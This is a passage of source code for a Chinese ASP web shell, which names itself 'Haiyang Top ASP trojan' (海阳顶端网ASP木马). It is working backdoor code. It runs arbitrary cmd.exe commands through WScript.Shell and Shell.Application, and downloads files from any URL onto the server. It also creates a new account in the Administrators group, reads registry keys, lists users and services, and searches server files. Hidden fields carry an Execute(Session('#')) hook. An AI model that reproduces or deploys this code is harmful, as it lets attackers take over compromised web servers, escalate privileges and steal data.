		strDscList = "广告轮换,浏览器信息,内容链接库,,,计数器,内容轮显,,权限检测,ADO 数据对象,SA-FileUp 文件上传,SoftArtisans 文件管理," &amp; _
					 "刘云峰的文件上传组件,ASPUpload 文件上传,Dimac 文件上传,Dimac JMail 邮件收发,虚拟 SMTP 发信,ASPemail 发信,ASPmail 发信,dkQmail 发信," &amp; _
					 "Geocel 发信,IISmail 发信,SmtpMail 发信,SA 的图像读写,Dimac 的图像读写组件," &amp; _
					 "FSO,Stream 流,,,"

		aryObjectList = Split(strObjectList, ",")
		aryDscList = Split(strDscList, ",")

		showTitle("服务器组件支持情况检测")

		echo "其他组件支持情况检测&lt;br/>"
		echo "在下面的输入框中输入你要检测的组件的ProgId或ClassId。&lt;br/>"
		echo "&lt;form method=post>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=txtObjInfo size=30 value=""" &amp; txtObjInfo &amp; """>&lt;input name=theAct type=submit value=我要检测>"
		echo "&lt;/form>"

		If Request("theAct") = "我要检测" And txtObjInfo &lt;> "" Then
			Call getObjInfo(txtObjInfo, "")
		End If
		
		echo "&lt;hr/>"
		echo "&lt;lu>组件名称 ┆ 支持及其它"

		For i = 0 To UBound(aryDscList)
			Call getObjInfo(aryObjectList(i), aryDscList(i))
		Next

		echo "&lt;/lu>&lt;hr/>Powered By Marcos 2005.02"		
	End Sub
	
	Sub getObjInfo(strObjInfo, strDscInfo)
		Dim objTmp

		If isDebugMode = False Then
			On Error Resume Next
		End If

		echo "&lt;li> " &amp; strObjInfo
		If strDscInfo &lt;> "" Then
			echo " (" &amp; strDscInfo &amp; "组件)"
		End If

		echo " ┆ "

		Set objTmp = Server.CreateObject(strObjInfo)
		If Err &lt;> -2147221005 Then
			echo "√ "
			echo "Version: " &amp; objTmp.Version &amp; "; "
			echo "About: " &amp; objTmp.About
		 Else
			echo "×"
		End If
		echo "&lt;/li>"

		If Err Then
			Err.Clear
		End If
		
		Set objTmp = Nothing
	End Sub

	Sub PageOtherTools()
		Dim theAct
		theAct = Request("theAct")

		showTitle("一些零碎的小东西")

		Select Case theAct
			Case "downFromUrl"
				downFromUrl()
				Response.End
			Case "addUser"
				AddUser Request("userName"), Request("passWord")
				Response.End
			Case "readReg"
				readReg()
				Response.End
		End Select

		echo "数制转换:&lt;hr/>"
		echo "&lt;input name=text1 value=字符和数字转10和16进制 size=25 id=text9>"
		echo "&lt;input type=button onclick=main(); value=给我转>"
		echo "&lt;input value=16进制转10进制和字符 size=25 id=vars>"
		echo "&lt;input type=button onClick=main2(); value=给我转>"
		echo "&lt;hr/>"
		
		echo "下载到服务器:&lt;hr/>"
		echo "&lt;form method=post target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input name=theUrl value='http://' size=80>&lt;input type=submit value=' 下载 '>&lt;br/>"
		echo "&lt;input name=thePath value=""" &amp; HtmlEncode(Server.MapPath(".")) &amp; """ size=80>"
		echo "&lt;input type=checkbox name=overWrite value=2>存在覆盖"
		echo "&lt;input type=hidden value=downFromUrl name=theAct>"
		echo "&lt;/form>"
		echo "&lt;hr/>"
		
		echo "文件编辑:&lt;hr/>"
		echo "&lt;form method=post action='?' target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input size=80 name=thePath value=""" &amp; HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) &amp; """>"
		echo "&lt;input type=hidden value=showEdit name=theAct>"
		echo "&lt;select name=pageName>&lt;option value=AppFileExplorer>用Stream&lt;/option>&lt;option value=FsoFileExplorer>用FSO&lt;/option>&lt;/select>"
		echo "&lt;input type=submit value=' 打开 '>"
		echo "&lt;/form>&lt;hr/>"
		
		echo "管理帐号添加(成功率极低):&lt;hr/>"
		echo "&lt;form method=post target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden value=addUser name=theAct>"
		echo "&lt;input name=userName value='HYTop' size=39>"
		echo "&lt;input name=passWord type=password value='HYTop' size=39>"
		echo "&lt;input type=submit value=' 添加 '>"
		echo "&lt;/form>&lt;hr/>"
		
		echo "注册表键值读取(&lt;a href=javascript:showHideMe(regeditInfo);>资料&lt;/a>):&lt;hr/>"
		echo "&lt;form method=post target=_blank>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden value=readReg name=theAct>"
		echo "&lt;input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
		echo "&lt;input type=submit value=' 读取 '>"
		echo "&lt;span id=regeditInfo style='display:none;'>&lt;hr/>"
		echo "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {不显示上次登录用户}&lt;br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=缺省,1=匿名用户无法列举本机用户列表,2=匿名用户无法连接本机IPC$共享}&lt;br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {禁止默认共享}&lt;br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {关闭网络共享}&lt;br/>"
		echo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {启用TCP/IP筛选(所有试配器)}&lt;br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {允许IP路由}&lt;br/>"
		echo "-------以下似乎要看绑定的网卡,不知道是否准确---------&lt;br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {默认网关}&lt;br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {首DNS}&lt;br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {允许的TCP/IP端口}&lt;br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {允许的UDP端口}&lt;br/>"
		echo "-----------OVER--------------------&lt;br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {共几块活动网卡}&lt;br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {当前网卡的序列(把上面的替换)}&lt;br/>"
		echo "==========================================================&lt;br/>以上资料由kEvin1986提供"
		echo "&lt;/span>"
		echo "&lt;/form>&lt;hr/>"
		
		echo "&lt;script language=vbs>" &amp; vbNewLine
		echo "sub main()" &amp; vbNewLine
		echo "base=document.all.text9.value" &amp; vbNewLine
		echo "If IsNumeric(base) Then" &amp; vbNewLine
		echo "cc=hex(cstr(base))" &amp; vbNewLine
		echo "alert(""10进制为""&amp;base)" &amp; vbNewLine
		echo "alert(""16进制为""&amp;cc)" &amp; vbNewLine
		echo "exit sub" &amp; vbNewLine
		echo "end if" &amp; vbNewLine
		echo "aa=asc(cstr(base))" &amp; vbNewLine
		echo "bb=hex(aa)" &amp; vbNewLine
		echo "alert(""10进制为""&amp;aa)" &amp; vbNewLine
		echo "alert(""16进制为""&amp;bb)" &amp; vbNewLine
		echo "end sub" &amp; vbNewLine
		echo "sub main2()" &amp; vbNewLine
		echo "If document.all.vars.value&lt;>"""" Then" &amp; vbNewLine
		echo "Dim nums,tmp,tmpstr,i" &amp; vbNewLine
		echo "nums=document.all.vars.value" &amp; vbNewLine
		echo "nums_len=Len(nums)" &amp; vbNewLine
		echo "For i=1 To nums_len" &amp; vbNewLine
		echo "tmp=Mid(nums,i,1)" &amp; vbNewLine
		echo "If IsNumeric(tmp) Then" &amp; vbNewLine
		echo "tmp=tmp * 16 * (16^(nums_len-i-1))" &amp; vbNewLine
		echo "Else" &amp; vbNewLine
		echo "If ASC(UCase(tmp))&lt;65 Or ASC(UCase(tmp))>70 Then" &amp; vbNewLine
		echo "alert(""你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。"")" &amp; vbNewLine
		echo "exit sub" &amp; vbNewLine
		echo "End If" &amp; vbNewLine
		echo "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" &amp; vbNewLine
		echo "End If" &amp; vbNewLine
		echo "tmpstr=tmpstr+tmp" &amp; vbNewLine
		echo "Next" &amp; vbNewLine
		echo "alert(""转换的10进制为:""&amp;tmpstr&amp;""其字符值为:""&amp;chr(tmpstr))" &amp; vbNewLine
		echo "End If" &amp; vbNewLine
		echo "end sub" &amp; vbNewLine
		echo "&lt;/script>" &amp; vbNewLine

		echo "Powered By Marcos 2005.02"
	End Sub
	
	Sub downFromUrl()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("Adodb.Stream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite &lt;> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState &lt;> 4 Then 
			Exit Sub
		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath &amp; "\" &amp; fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		alertThenClose("文件 " &amp; Replace(thePath, "\", "\\") &amp; " 下载成功!")
		
		Set Http = Nothing
		Set Stream = Nothing
	End Sub
	
	Sub AddUser(strUser, strPassword)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim computer, theUser, theGroup
		Set computer = Getobject("WinNT://.")
		Set theGroup = GetObject("WinNT://./Administrators,group")
		
		Set theUser = computer.Create("User", strUser)
		theUser.SetPassword(strPassword)
		chkErr(Err)
		theUser.SetInfo
		chkErr(Err)
		theGroup.Add theUser
		chkErr(Err)
		
		Set theUser = Nothing
		Set computer = Nothing
		Set theGroup = Nothing
		
		echo getUserInfo(strUser)
	End Sub
	
	Sub readReg()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, thePath, theArray
		thePath = Request("thePath")
'		echo thePath &amp; "&lt;br/>"
		theArray = wsX.RegRead(thePath)
		If IsArray(theArray) Then
			For i = 0 To UBound(theArray)
				echo "&lt;li>" &amp; theArray(i)
			Next
		 Else
			echo "&lt;li>" &amp; theArray
		End If
		chkErr(Err)
	End Sub

	Sub PageList()
		showTitle("功能模块列表")

		echo "&lt;base target=_blank>"
		echo "海阳顶端网ASP木马@2006&lt;hr/>"
		echo "&lt;ol>&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=ServiceList'>系统服务信息&lt;/a>&lt;/li>"
		echo "&lt;br/>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=infoAboutSrv'>服务器相关数据&lt;/a>&lt;br/>("
		echo "&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=infoAboutSrv&amp;theAct=getSrvInfo'>系统参数&lt;/a>,"
		echo "&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=infoAboutSrv&amp;theAct=getSrvDrvInfo'>系统磁盘&lt;/a>,"
		echo "&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=infoAboutSrv&amp;theAct=getSiteRootInfo'>站点文件夹&lt;/a>,"
		echo "&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=infoAboutSrv&amp;theAct=getTerminalInfo'>终端端口&amp;自动登录&lt;/a>)&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=objOnSrv'>服务器组件探针&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=userList'>系统用户及用户组信息&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=CSInfo'>客户端服务器交互信息&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=WsCmdRun'>WScript.Shell程序运行器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=SaCmdRun'>Shell.Application程序运行器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=FsoFileExplorer'>FSO文件浏览操作器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=AppFileExplorer'>Shell.Application文件浏览操作器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=MsDataBase'>微软数据库查看/操作器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=PageAddToMdb'>文件夹打包/解开器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=TxtSearcher'>文本文件搜索器&lt;/a>&lt;/li>"
		echo "&lt;li>&lt;a href='?%23=Execute(Session(%22%23%22))&amp;pageName=OtherTools'>一些零碎的小东西&lt;/a>&lt;/li>"
		echo "&lt;/ol>"
		echo "&lt;hr/>Powered By Marcos 2005.02"
	End Sub

	Sub PageSaCmdRun()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, thePath, theAct, appPath, appName, appArgs
		
		showTitle("Shell.Application命令行操作")
		
		theAct = Trim(Request("theAct"))
		appPath = Trim(Request("appPath"))
		thePath = Trim(Request("thePath"))
		appName = Trim(Request("appName"))
		appArgs = Trim(Request("appArgs"))

		If theAct = "doAct" Then
			If appName = "" Then
				appName = "cmd.exe"
			End If
		
			If appPath &lt;> "" And Right(appPath, 1) &lt;> "\" Then
				appPath = appPath &amp; "\"
			End If
		
			If LCase(appName) = "cmd.exe" And appArgs &lt;> "" Then
				If LCase(Left(appArgs, 2)) &lt;> "/c" Then
					appArgs = "/c " &amp; appArgs
				End If
			Else
				If LCase(appName) = "cmd.exe" And appArgs = "" Then
					appArgs = "/c "
				End If
			End If
			
			saX.ShellExecute appName, appArgs, appPath, "", 0
			chkErr(Err)
		End If
		
		If theAct = "readResult" Then
			Err.Clear
			echo encode(streamLoadFromFile(aspPath))
			If Err Then
				Set theFile = fsoX.OpenTextFile(aspPath)
				echo encode(theFile.ReadAll())
				Set theFile = Nothing
			End If
			Response.End
		End If
		
		echo "&lt;style>body{margin:8;border:none;background-color:buttonface;}&lt;/style>"
		echo "&lt;body onload=""document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
		echo "&lt;form method=post onSubmit='this.Submit.disabled=true'>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden name=theAct value=doAct>"
		echo "&lt;input type=hidden name=aspPath value=""" &amp; HtmlEncode(aspPath) &amp; """>"
		echo "所在路径: &lt;input name=appPath type=text id=appPath value=""" &amp; HtmlEncode(appPath) &amp; """ size=62>&lt;br/>"
		echo "程序文件: &lt;input name=appName type=text id=appName value=""" &amp; HtmlEncode(appName) &amp; """ size=62> "
		echo "&lt;input type=button name=Submit4 value=' 回显 ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;"">&lt;br/> "
		echo "命令参数: &lt;input name=appArgs type=text id=appArgs value=""" &amp; HtmlEncode(appArgs) &amp; """ size=62> "
		echo "&lt;input type=submit name=Submit value=' 运行 '>&lt;br/>"
		echo "&lt;hr/>注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用"">""符号),其它程序只能执行不能回显.&lt;br/>"
		echo "　&amp;nbsp; 由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.&lt;hr/>"
		echo "&lt;iframe id=cmdResult style='width:100%;height:78%;'>"
		echo "&lt;/iframe>"
		echo "&lt;/form>"
		echo "&lt;/body>"
	End Sub

	Sub PageServiceList()
		Dim sa, objService, objComputer
		
		showTitle("系统服务信息查看")
		Set objComputer = GetObject("WinNT://.")
		Set sa = Server.CreateObject("Shell.Application")
		objComputer.Filter = Array("Service")
		
		echo "&lt;ol>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		For Each objService In objComputer
			echo "&lt;li>" &amp; objService.Name &amp; "&lt;/li>&lt;hr/>"
			echo "&lt;ol>服务名称: " &amp; objService.Name &amp; "&lt;br/>"
			echo "显示名称: " &amp; objService.DisplayName &amp; "&lt;br/>"
			echo "启动类型: " &amp; getStartType(objService.StartType) &amp; "&lt;br/>"
			echo "运行状态: " &amp; sa.IsServiceRunning(objService.Name) &amp; "&lt;br/>"
'			echo "当前状态: " &amp; objService.Status &amp; "&lt;br/>"
'			echo "服务类型: " &amp; objService.ServiceType &amp; "&lt;br/>"
			echo "登录身份: " &amp; objService.ServiceAccountName &amp; "&lt;br/>"
			echo "服务描述: " &amp; getServiceDsc(objService.Name) &amp; "&lt;br/>"
			echo "文件路径及参数: " &amp; objService.Path
			echo "&lt;/ol>&lt;hr/>"
		Next
		echo "&lt;/ol>&lt;hr/>Powered By Marcos 2005.02"
		
		Set sa = Nothing
	End Sub
	
	Function getServiceDsc(strService)
		Dim ws
		Set ws = Server.CreateObject("WScript.Shell")
		getServiceDsc = ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" &amp; strService &amp; "\Description")
		Set ws = Nothing
	End Function

	Sub PageTxtSearcher()
		Response.Buffer = True
		Server.ScriptTimeOut = 5000
		Dim keyword, theAct, thePath, theFolder
		theAct = Request("theAct")
		keyword = Trim(Request("keyword"))
		thePath = Trim(Request("thePath"))
		
		showTitle("文本文件搜索器")
		
		If thePath = "" Then
			thePath = Server.MapPath("\")
		End If
		
		echo "FSO文件搜索:"
		echo "&lt;hr/>"
		echo "&lt;form name=form1 method=post action=?pageName=TxtSearcher&amp;theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "路径: &lt;input name=thePath type=text value=""" &amp; HtmlEncode(thePath) &amp; """ id=thePath size=61>&lt;br/>"
		echo "关键字: &lt;input name=keyword type=text value=""" &amp; HtmlEncode(keyword) &amp; """ id=keyword size=60>"
		echo "&lt;input type=submit name=Submit value=给我搜>"
		echo "&lt;/form>"
		echo "&lt;hr/>"
		echo "Shell.Application &amp;amp; Adodb.Stream文件搜索:"
		echo "&lt;hr/>"
		echo "&lt;form name=form1 method=post action=?pageName=TxtSearcher&amp;theAct=saSearch onsubmit=this.Submit2.disabled=true>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "路径: &lt;input name=thePath type=text value=""" &amp; HtmlEncode(thePath) &amp; """ id=thePath size=61>&lt;br/>"
		echo "关键字: &lt;input name=keyword type=text value=""" &amp; HtmlEncode(keyword) &amp; """ id=keyword size=60>"
		echo "&lt;input type=submit name=Submit2 value=给我搜>"
		echo "&lt;/form>"
		echo "&lt;hr/>"
		
		If theAct = "fsoSearch" And keyword &lt;> "" Then
			Set theFolder = fsoX.GetFolder(thePath)
			Call searchFolder(theFolder, keyword)
			Set theFolder = Nothing
		End If
		
		If theAct = "saSearch" And keyword &lt;> "" Then
			Call appSearchIt(thePath, keyword)
		End If
		
		echo "&lt;hr/>Powered By Marcos 2005.02"
	End Sub
	
	Sub searchFolder(folder, str)
		Dim ext, title, theFile, theFolder
		For Each theFile In folder.Files
			ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
			If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
				echo fileLink(theFile, "")
			End If
			If ext = "asp" Or ext = "asa" Or ext = "cer" Or ext = "cdx" Then
				If searchFile(theFile, str, title, "fso") Then
					echo fileLink(theFile, title)
				End If
			End If
		Next
		Response.Flush()
		For Each theFolder In folder.subFolders
			searchFolder theFolder, str
		Next
	end sub
	
	Function searchFile(f, s, title, method)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, content, pos1, pos2
		
		If method = "fso" Then
			Set theFile = fsoX.OpenTextFile(f.Path)
			content = theFile.ReadAll()
			theFile.Close
			Set theFile = Nothing
		 Else
			content = streamLoadFromFile(f.Path)
		End If
		
		If Err Then
			Err.Clear
			content = ""
		End If
		
		searchFile = InStr(1, content, S, vbTextCompare) > 0 
		If searchFile Then
			pos1 = InStr(1, content, "&lt;TITLE>", vbTextCompare)
			pos2 = InStr(1, content, "&lt;/TITLE>", vbTextCompare)
			title = ""
			If pos1 > 0 And pos2 > 0 Then
				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
			End If
		End If
	End Function
	
	Function fileLink(f, title)
		fileLink = f.Path
		If title = "" Then
			title = f.Name
		End If
		fileLink = "&lt;li>&lt;font color=ff0000>" &amp; title &amp; "&lt;/font> " &amp; fileLink &amp; "&lt;/li>"
	End Function
	
	Sub appSearchIt(thePath, theKey)
		Dim title, extName, objFolder, objItem, fileName
		Set objFolder = saX.NameSpace(thePath)
		
		For Each objItem In objFolder.Items
			If objItem.IsFolder = True Then
				Call appSearchIt(objItem.Path, theKey)
				Response.Flush()
			 Else
				extName = LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
				fileName = Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
				If InStr(LCase(fileName), LCase(theKey)) > 0 Then
					echo fileLink(objItem, "")
				End If
				If extName = "asp" Or extName = "asa" Or extName = "cer" Or extName = "cdx" Then
					If searchFile(objItem, theKey, title, "application") Then
						echo fileLink(objItem, title)
					End If
				End If
			End If
		Next
	End Sub

	Sub PageUserList()
		Dim objUser, objGroup, objComputer
		
		showTitle("系统用户及用户组信息查看")
		Set objComputer = GetObject("WinNT://.")
		objComputer.Filter = Array("User")
		echo "&lt;a href=javascript:showHideMe(userList);>User:&lt;/a>"
		echo "&lt;span id=userList>&lt;hr/>"
		For Each objUser in objComputer
			echo "&lt;li>" &amp; objUser.Name &amp; "&lt;/li>"
			echo "&lt;ol>&lt;hr/>"
			getUserInfo(objUser.Name)
			echo "&lt;hr/>&lt;/ol>"
		Next
		echo "&lt;/span>"
		
		echo "&lt;br/>&lt;a href=javascript:showHideMe(userGroupList);>UserGroup:&lt;/a>"
		echo "&lt;span id=userGroupList>&lt;hr/>"
		objComputer.Filter = Array("Group")
		For Each objGroup in objComputer
			echo "&lt;li>" &amp; objGroup.Name &amp; "&lt;/li>"
			echo "&lt;ol>&lt;hr/>" &amp; objGroup.Description &amp; "&lt;hr/>&lt;/ol>"
		Next
		echo "&lt;/span>&lt;hr/>Powered By Marcos 2005.02"

	End Sub
	
	Sub getUserInfo(strUser)
		Dim User, Flags
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set User = GetObject("WinNT://./" &amp; strUser &amp; ",user")
		echo "描述: " &amp; User.Description &amp; "&lt;br/>"
		echo "所属用户组: " &amp; getItsGroup(strUser) &amp; "&lt;br/>"
		echo "密码已过期: " &amp; cbool(User.Get("PasswordExpired")) &amp; "&lt;br/>"
		Flags = User.Get("UserFlags")
		echo "密码永不过期: " &amp; cbool(Flags And &amp;H10000) &amp; "&lt;br/>"
		echo "用户不能更改密码: " &amp; cbool(Flags And &amp;H00040) &amp; "&lt;br/>"
		echo "非全局帐号: " &amp; cbool(Flags And &amp;H100) &amp; "&lt;br/>"
		echo "密码的最小长度: " &amp; User.PasswordMinimumLength &amp; "&lt;br/>"
		echo "是否要求有密码: " &amp; User.PasswordRequired &amp; "&lt;br/>"
		echo "帐号停用中: " &amp; User.AccountDisabled &amp; "&lt;br/>"
		echo "帐号锁定中: " &amp; User.IsAccountLocked &amp; "&lt;br/>"
		echo "用户信息文件: " &amp; User.Profile &amp; "&lt;br/>"
		echo "用户登录脚本: " &amp; User.LoginScript &amp; "&lt;br/>"
		echo "用户Home目录: " &amp; User.HomeDirectory &amp; "&lt;br/>"
		echo "用户Home目录根: " &amp; User.Get("HomeDirDrive") &amp; "&lt;br/>"
		echo "帐号过期时间: " &amp; User.AccountExpirationDate &amp; "&lt;br/>"
		echo "帐号失败登录次数: " &amp; User.BadLoginCount &amp; "&lt;br/>"
		echo "帐号最后登录时间: " &amp; User.LastLogin &amp; "&lt;br/>"
		echo "帐号最后注销时间: " &amp; User.LastLogoff &amp; "&lt;br/>"
		For Each RegTime In User.LoginHours
			If RegTime &lt; 255 Then
				Restrict = True
			End If
		Next
		echo "帐号已用时间: " &amp; Restrict &amp; "&lt;br/>"
		Err.Clear
	End Sub
	
	Function getItsGroup(strUser)
		Dim objUser, objGroup
		Set objUser = GetObject("WinNT://./" &amp; strUser &amp; ",user")
		For Each objGroup in objUser.Groups
			getItsGroup = getItsGroup &amp; " " &amp; objGroup.Name
		Next
	End Function

	Sub PageWsCmdRun()
		Dim cmdStr, cmdPath, cmdResult
		cmdStr = Request("cmdStr")
		cmdPath = Request("cmdPath")
		
		showTitle("WScript.Shell命令行操作")
		
		If cmdPath = "" Then
			cmdPath = "cmd.exe"
		End If
		
		If cmdStr &lt;> "" Then
			If InStr(LCase(cmdPath), "cmd.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
				cmdResult = doWsCmdRun(cmdPath &amp; " /c " &amp; cmdStr)
			 Else
		 		If LCase(cmdPath) = "wscriptshell" Then
					cmdResult = doWsCmdRun(cmdStr)
				 Else
					cmdResult = doWsCmdRun(cmdPath &amp; " " &amp; cmdStr)
				End If
			End If
		End If
		
		echo "&lt;style>body{margin:8;}&lt;/style>"
		echo "&lt;body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
		echo "&lt;form method=post onSubmit='this.Submit.disabled=true'>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "路径: &lt;input name=cmdPath type=text id=cmdPath value=""" &amp; HtmlEncode(cmdPath) &amp; """ size=50> "
		echo "&lt;input type=button name=Submit2 value=使用WScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';"">&lt;br/>"
		echo "命令/参数: &lt;input name=cmdStr type=text id=cmdStr value=""" &amp; HtmlEncode(cmdStr) &amp; """ size=62> "
		echo "&lt;input type=submit name=Submit value=' 运行 '>&lt;br/>"
		echo "&lt;hr/>注: 请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.&lt;hr/>"
		echo "&lt;textarea id=cmdResult style='width:100%;height:78%;'>"
		echo HtmlEncode(cmdResult)
		echo "&lt;/textarea>"
		echo "&lt;/form>"
		echo "&lt;/body>"
	End Sub
	
	Function doWsCmdRun(cmdStr)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fso, theFile
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		
		doWsCmdRun = wsX.Exec(cmdStr).StdOut.ReadAll()
		If Err Then
			echo Err.Description &amp; "&lt;br>"
			Err.Clear
			wsX.Run cmdStr &amp; " > " &amp; aspPath, 0, True
			Set theFile = fso.OpenTextFile(aspPath)
			doWsCmdRun = theFile.RealAll()
			If Err Then
				echo Err.Description &amp; "&lt;br>"
				Err.Clear
				doWsCmdRun = streamLoadFromFile(aspPath)
			End If
		End If
		
		Set fso = Nothing
	End Function

	Sub PageOther()
		echo "&lt;style>"
		echo "A:visited {color: #333333;text-decoration: none;}"
		echo "A:active {color: #333333;text-decoration: none;}"
		echo "A:link {color: #000000;text-decoration: none;}"
		echo "A:hover {color: #333333;text-decoration: none;}"
		echo "BODY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
		echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}"
		echo "table {font-size: 9pt;}"
		echo "form {margin: 0;}"
		echo "#fsoDriveList span{width: 100px;}"
		echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
		echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
		echo ".font{font-size: 35px;line-height: 40px;}"
		echo "#fileExplorerTools {background-color: buttonFace;}"
		echo ".input, input {border-width: 1px;}"
		echo "&lt;/style>" &amp; vbNewLine
		
		echo "&lt;script language=javascript>" &amp; vbNewLine
		echo "function showHideMe(me){" &amp; vbNewLine
		echo "if(me.innerText == ''){" &amp; vbNewLine
		echo "me.innerText = '\nNo Contents!';" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "if(me.style.display == 'none'){" &amp; vbNewLine
		echo "me.style.display = '';" &amp; vbNewLine
		echo "}else{" &amp; vbNewLine
		echo "me.style.display = 'none';" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "}" &amp; vbNewLine
		echo "function changeMyClass(me){" &amp; vbNewLine
		echo "if(me.className == ''){" &amp; vbNewLine
